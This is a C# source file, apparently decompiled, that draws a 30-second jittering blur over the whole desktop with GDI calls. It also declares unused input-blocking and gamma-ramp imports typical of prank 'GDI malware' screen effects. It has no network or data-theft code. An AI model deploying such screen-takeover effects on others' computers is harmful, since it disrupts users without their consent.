using System;
using System.Drawing;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace YYY;

internal class BLUR
{
	public struct RAMP
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Red;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Green;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		public ushort[] Blue;
	}

	public struct BITMAPINFO
	{
		public BITMAPINFOHEADER bmiHeader;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.Struct)]
		public RGBQUAD[] bmiColors;
	}

	public struct BITMAPINFOHEADER
	{
		public uint biSize;

		public int biWidth;

		public int biHeight;

		public ushort biPlanes;

		public ushort biBitCount;

		public uint biSizeImage;

		public int biXPelsPerMeter;

		public int biYPelsPerMeter;

		public uint biClrUsed;

		public uint biClrImportant;

		public uint biCompression;

		public void Init()
		{
			biSize = (uint)Marshal.SizeOf((object)this);
		}
	}

	private enum BitmapCompressionMode : uint
	{
		BI_RGB,
		BI_RLE8,
		BI_RLE4,
		BI_BITFIELDS,
		BI_JPEG,
		BI_PNG
	}

	private enum DIB_Color_Mode : uint
	{
		DIB_RGB_COLORS,
		DIB_PAL_COLORS
	}

	private enum StretchBltMode
	{
		STRETCH_ANDSCANS = 1,
		STRETCH_ORSCANS,
		STRETCH_DELETESCANS,
		STRETCH_HALFTONE
	}

	private struct PAINTSTRUCT
	{
		public IntPtr hdc;

		public bool fErase;

		public RECT rcPaint;

		public bool fRestore;

		public bool fIncUpdate;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
		public byte[] rgbReserved;
	}

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;

		public int X
		{
			get
			{
				return Left;
			}
			set
			{
				Right -= Left - value;
				Left = value;
			}
		}

		public int Y
		{
			get
			{
				return Top;
			}
			set
			{
				Bottom -= Top - value;
				Top = value;
			}
		}

		public int Height
		{
			get
			{
				return Bottom - Top;
			}
			set
			{
				Bottom = value + Top;
			}
		}

		public int Width
		{
			get
			{
				return Right - Left;
			}
			set
			{
				Right = value + Left;
			}
		}

		public Point Location
		{
			get
			{
				return new Point(Left, Top);
			}
			set
			{
				X = value.X;
				Y = value.Y;
			}
		}

		public Size Size
		{
			get
			{
				return new Size(Width, Height);
			}
			set
			{
				Width = value.Width;
				Height = value.Height;
			}
		}

		public RECT(int left, int top, int right, int bottom)
		{
			Left = left;
			Top = top;
			Right = right;
			Bottom = bottom;
		}

		public RECT(Rectangle r)
			: this(r.Left, r.Top, r.Right, r.Bottom)
		{
		}

		public static implicit operator Rectangle(RECT r)
		{
			return new Rectangle(r.Left, r.Top, r.Width, r.Height);
		}

		public static implicit operator RECT(Rectangle r)
		{
			return new RECT(r);
		}

		public static bool operator ==(RECT r1, RECT r2)
		{
			return r1.Equals(r2);
		}

		public static bool operator !=(RECT r1, RECT r2)
		{
			return !r1.Equals(r2);
		}

		public bool Equals(RECT r)
		{
			return r.Left == Left && r.Top == Top && r.Right == Right && r.Bottom == Bottom;
		}

		public override bool Equals(object obj)
		{
			if (obj is RECT)
			{
				return Equals((RECT)obj);
			}
			if (obj is Rectangle)
			{
				return Equals(new RECT((Rectangle)obj));
			}
			return false;
		}

		public override int GetHashCode()
		{
			return ((Rectangle)this).GetHashCode();
		}

		public override string ToString()
		{
			return string.Format(CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", Left, Top, Right, Bottom);
		}
	}

	private enum LoadLibraryFlags : uint
	{
		DONT_RESOLVE_DLL_REFERENCES = 1u,
		LOAD_IGNORE_CODE_AUTHZ_LEVEL = 16u,
		LOAD_LIBRARY_AS_DATAFILE = 2u,
		LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 64u,
		LOAD_LIBRARY_AS_IMAGE_RESOURCE = 32u,
		LOAD_WITH_ALTERED_SEARCH_PATH = 8u
	}

	private enum PenStyle
	{
		PS_SOLID = 0,
		PS_DASH = 1,
		PS_DOT = 2,
		PS_DASHDOT = 3,
		PS_DASHDOTDOT = 4,
		PS_NULL = 5,
		PS_INSIDEFRAME = 6,
		PS_USERSTYLE = 7,
		PS_ALTERNATE = 8,
		PS_STYLE_MASK = 15,
		PS_ENDCAP_ROUND = 0,
		PS_ENDCAP_SQUARE = 256,
		PS_ENDCAP_FLAT = 512,
		PS_ENDCAP_MASK = 3840,
		PS_JOIN_ROUND = 0,
		PS_JOIN_BEVEL = 4096,
		PS_JOIN_MITER = 8192,
		PS_JOIN_MASK = 61440,
		PS_COSMETIC = 0,
		PS_GEOMETRIC = 65536,
		PS_TYPE_MASK = 983040
	}

	public enum TernaryRasterOperations : uint
	{
		SRCCOPY = 13369376u,
		SRCPAINT = 15597702u,
		SRCAND = 8913094u,
		SRCINVERT = 6684742u,
		SRCERASE = 4457256u,
		NOTSRCCOPY = 3342344u,
		NOTSRCERASE = 1114278u,
		MERGECOPY = 12583114u,
		MERGEPAINT = 12255782u,
		PATCOPY = 15728673u,
		PATPAINT = 16452105u,
		PATINVERT = 5898313u,
		DSTINVERT = 5570569u,
		BLACKNESS = 66u,
		WHITENESS = 16711778u,
		CAPTUREBLT = 1073741824u,
		CUSTOM = 1051781u
	}

	public struct POINT
	{
		public int X;

		public int Y;

		public POINT(int x, int y)
		{
			X = x;
			Y = y;
		}

		public static implicit operator Point(POINT p)
		{
			return new Point(p.X, p.Y);
		}

		public static implicit operator POINT(Point p)
		{
			return new POINT(p.X, p.Y);
		}
	}

	public struct BLENDFUNCTION
	{
		private byte BlendOp;

		private byte BlendFlags;

		private byte SourceConstantAlpha;

		private byte AlphaFormat;

		public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
		{
			BlendOp = op;
			BlendFlags = flags;
			SourceConstantAlpha = alpha;
			AlphaFormat = format;
		}
	}

	public struct GRADIENT_RECT
	{
		public uint UpperLeft;

		public uint LowerRight;

		public GRADIENT_RECT(uint upLeft, uint lowRight)
		{
			UpperLeft = upLeft;
			LowerRight = lowRight;
		}
	}

	public struct TRIVERTEX
	{
		public int x;

		public int y;

		public ushort Red;

		public ushort Green;

		public ushort Blue;

		public ushort Alpha;

		public TRIVERTEX(int x, int y, ushort red, ushort green, ushort blue, ushort alpha)
		{
			this.x = x;
			this.y = y;
			Red = red;
			Green = green;
			Blue = blue;
			Alpha = alpha;
		}
	}

	public enum GRADIENT_FILL : uint
	{
		RECT_H = 0u,
		RECT_V = 1u,
		TRIANGLE = 2u,
		OP_FLAG = 255u
	}

	public struct GRADIENT_TRIANGLE
	{
		public uint Vertex1;

		public uint Vertex2;

		public uint Vertex3;

		public GRADIENT_TRIANGLE(uint vertex1, uint vertex2, uint vertex3)
		{
			Vertex1 = vertex1;
			Vertex2 = vertex2;
			Vertex3 = vertex3;
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct RGBQUAD
	{
		public byte rgbBlue;

		public byte rgbGreen;

		public byte rgbRed;

		public byte rgbReserved;
	}

	public const int LR_DEFAULTCOLOR = 0;

	public const int LR_MONOCHROME = 1;

	public const int LR_COPYRETURNORG = 4;

	public const int LR_COPYDELETEORG = 8;

	public const int LR_LOADFROMFILE = 16;

	public const int LR_LOADTRANSPARENT = 32;

	public const int LR_DEFAULTSIZE = 64;

	public const int LR_VGACOLOR = 128;

	public const int LR_LOADMAP3DCOLORS = 4096;

	public const int LR_CREATEDIBSECTION = 8192;

	public const int LR_COPYFROMRESOURCE = 16384;

	public const int LR_SHARED = 32768;

	private const int AC_SRC_OVER = 0;

	private const int AC_SRC_ALPHA = 1;

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreatePen(PenStyle fnPenStyle, int nWidth, uint crColor);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("gdi32.dll", SetLastError = true)]
	private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	private static extern bool MoveToEx(IntPtr hdc, int X, int Y, IntPtr lpPoint);

	[DllImport("gdi32.dll", SetLastError = true)]
	private static extern bool MaskBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, IntPtr hbmMask, int xMask, int yMask, uint rop);

	[DllImport("gdi32.dll")]
	private static extern bool LineTo(IntPtr hdc, int nXEnd, int nYEnd);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject(IntPtr hObject);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr Ellipse(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

	[DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
	public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLENDFUNCTION blendFunction);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint crColor);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	private static extern bool FloodFill(IntPtr hdc, int nXStart, int nYStart, uint crFill);

	[DllImport("gdi32.dll", EntryPoint = "GdiGradientFill", ExactSpelling = true)]
	public static extern bool GradientFill(IntPtr hdc, TRIVERTEX[] pVertex, uint dwNumVertex, GRADIENT_RECT[] pMesh, uint dwNumMesh, GRADIENT_FILL dwMode);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	private static extern IntPtr GetWindowDC(IntPtr hwnd);

	[DllImport("user32.dll")]
	private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

	[DllImport("User32.dll")]
	private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

	[DllImport("gdi32.dll")]
	private static extern bool FillRgn(IntPtr hdc, IntPtr hrgn, IntPtr hbr);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

	[DllImport("gdi32.dll")]
	private static extern bool Pie(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	private static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

	[DllImport("gdi32.dll")]
	private static extern uint SetPixel(IntPtr hdc, int X, int Y, int crColor);

	[DllImport("gdi32.dll")]
	private static extern IntPtr GetPixel(IntPtr hdc, int nXPos, int nYPos);

	[DllImport("gdi32.dll")]
	private static extern bool AngleArc(IntPtr hdc, int X, int Y, uint dwRadius, float eStartAngle, float eSweepAngle);

	[DllImport("gdi32.dll")]
	private static extern bool RoundRect(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	private static extern bool DeleteMetaFile(IntPtr hmf);

	[DllImport("gdi32.dll")]
	private static extern bool CancelDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	private static extern bool Polygon(IntPtr hdc, POINT[] lpPoints, int nCount);

	[DllImport("gdi32.dll")]
	private static extern int SetBitmapBits(IntPtr hbmp, int cBytes, RGBQUAD[] lpBits);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool Beep(uint dwFreq, uint dwDuration);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr LoadImage(IntPtr hinst, string lpszName, uint uType, int cxDesired, int cyDesired, uint fuLoad);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int DestroyIcon(IntPtr hIcon);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr LoadLibraryEx(IntPtr lpFileName, IntPtr hFile, LoadLibraryFlags dwFlags);

	[DllImport("user32.dll")]
	private static extern IntPtr LoadBitmap(IntPtr hInstance, string lpBitmapName);

	[DllImport("user32.dll")]
	private static extern IntPtr BeginPaint(IntPtr hwnd, out PAINTSTRUCT lpPaint);

	[DllImport("user32.dll")]
	private static extern bool EndPaint(IntPtr hWnd, out PAINTSTRUCT lpPaint);

	[DllImport("gdi32.dll")]
	private static extern int SetStretchBltMode(IntPtr hdc, StretchBltMode iStretchMode);

	[DllImport("gdi32.dll")]
	private static extern int StretchDIBits(IntPtr hdc, int XDest, int YDest, int nDestWidth, int nDestHeight, int XSrc, int YSrc, int nSrcWidth, int nSrcHeight, RGBQUAD rgbq, [In] ref BITMAPINFO lpBitsInfo, DIB_Color_Mode dib_mode, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	public static extern bool SetDeviceGammaRamp(IntPtr hDC, ref RAMP lpRamp);

	[DllImport("Gdi32")]
	private static extern long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, RGBQUAD[] lpvBits);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateHatchBrush(int iHatch, uint Color);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreatePatternBrush(IntPtr hbmp);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateDIBitmap(IntPtr hdc, [In] ref BITMAPINFOHEADER lpbmih, uint fdwInit, byte[] lpbInit, [In] ref BITMAPINFO lpbmi, uint fuUsage);

	[DllImport("gdi32.dll")]
	private static extern int SetDIBitsToDevice(IntPtr hdc, int XDest, int YDest, uint dwWidth, uint dwHeight, int XSrc, int YSrc, uint uStartScan, uint cScanLines, byte[] lpvBits, [In] ref BITMAPINFO lpbmi, uint fuColorUse);

	[DllImport("gdi32.dll")]
	private static extern IntPtr SetDIBits(IntPtr hdc, IntPtr hbm, uint start, int line, int lpBits, [In] ref BITMAPINFO lpbmi, DIB_Color_Mode ColorUse);

	public static void Main()
	{
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 268433152u, 65519u };
		while (DateTime.Now - now < timeSpan)
		{
			Random random = new Random();
			IntPtr dC = GetDC(IntPtr.Zero);
			IntPtr intPtr = CreateCompatibleDC(dC);
			IntPtr intPtr2 = CreateCompatibleBitmap(dC, width, height);
			IntPtr intPtr3 = SelectObject(intPtr, intPtr2);
			BitBlt(intPtr, 0, 0, width, height, dC, 0, 0, TernaryRasterOperations.SRCCOPY);
			AlphaBlend(dC, random.Next(-4, 4), random.Next(-4, 4), width, height, intPtr, 0, 0, width, height, new BLENDFUNCTION(0, 0, 70, 0));
			SelectObject(intPtr, intPtr3);
			DeleteObject(intPtr3);
			DeleteObject(intPtr2);
			DeleteDC(intPtr);
			DeleteDC(dC);
			Thread.Sleep(50);
		}
	}

	internal static void BTC()
	{
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 268433152u, 65519u };
		while (DateTime.Now - now < timeSpan)
		{
			Random random = new Random();
			IntPtr dC = GetDC(IntPtr.Zero);
			IntPtr intPtr = CreateCompatibleDC(dC);
			IntPtr intPtr2 = CreateCompatibleBitmap(dC, width, height);
			IntPtr intPtr3 = SelectObject(intPtr, intPtr2);
			BitBlt(intPtr, 0, 0, width, height, dC, 0, 0, TernaryRasterOperations.SRCCOPY);
			AlphaBlend(dC, random.Next(-4, 4), random.Next(-4, 4), width, height, intPtr, 0, 0, width, height, new BLENDFUNCTION(0, 0, 70, 0));
			SelectObject(intPtr, intPtr3);
			DeleteObject(intPtr3);
			DeleteObject(intPtr2);
			DeleteDC(intPtr);
			DeleteDC(dC);
			Thread.Sleep(50);
		}
	}
}
